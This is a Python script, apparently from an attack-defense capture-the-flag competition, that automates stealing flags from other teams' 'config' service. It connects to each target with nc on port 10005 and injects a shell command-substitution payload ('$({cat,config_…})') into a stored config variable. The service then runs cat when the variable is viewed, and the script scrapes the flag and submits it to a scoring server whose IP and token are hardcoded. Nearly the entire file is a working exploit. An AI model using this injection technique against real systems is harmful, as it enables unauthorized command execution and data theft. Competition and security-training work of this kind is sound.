# Attempts to steal flags from all teams (except the test team and
# our own!) for the 'config' service
def name():
    return "steal-config-flags"

def help():
    return "Steal flags from the 'config' service!"

def args():
    return ""

def run(args):
    from re import search
    from subprocess import Popen, PIPE, STDOUT
    from threading import Timer
    import swpag_client

    # Retrieve the list of flag targets for this tick for service 5 (configuration)
    t = swpag_client.Team("http://34.195.187.175", "f67634a9373be60a439287965e1d8562")
    config_flags = t.get_targets(5)

    for target in config_flags:
        try:
            team = target['hostname']
            flag_id = target['flag_id']

            # Make sure we're not trying to hack ourselves or the test accounts
            if team in ["team9", "team11", "team12"]:
                print("Skipping {0}".format(team))
                continue

            print("Trying {0}...".format(team))

            # Spin up an nc process for the service and a timer. The timer is a
            # fallback mechanism to ensure the process doesn't hang if we get
            # into an unexpected situation.
            p = Popen(["nc", team, "10005"], stdout=PIPE, stdin=PIPE)
            tt = Timer(1.5, p.kill)
            tt.start()
            
            # Read output until we get to the prompt
            for i in range(0,15):
                out = p.stdout.readline().decode()
                if "or (q)uit" in out:
                    break

            # Send the commands to define our malicious config variable, then ask
            # the service to save it to a file.
            p.stdin.write("d\na\n$({{cat,config_{0}}})\ns\n".format(flag_id).encode())
            p.stdin.flush()

            # Read output until we find the line telling us the name of our file
            for i in range(0,15):
                out = p.stdout.readline().decode()
                m = search("config_(\w+)!", out)
                if m != None:
                    break

            if m == None:
                continue

            # Load the file, then view our variables. This executes the 'cat'
            # command we put in our crafted variable
            p.stdin.write("l\nconfig_{0}\nv\n".format(m.group(1)).encode())
            p.stdin.flush()

            # Read output until we find the flag
            for i in range(0,30):
                out = p.stdout.readline().decode()
                m = search("CONFIG_flag=(\w+)", out)
                if m != None:
                    break

            if m == None:
                continue

            # Send the flag to the scoring service, then cancel the timer since
            # we no longer need it.
            result = t.submit_flag([m.group(1)])
            tt.cancel()

            print("Submitting flag {0} for team {1}: {2}".format(m.group(1), team, result))
        except:
            print("Error")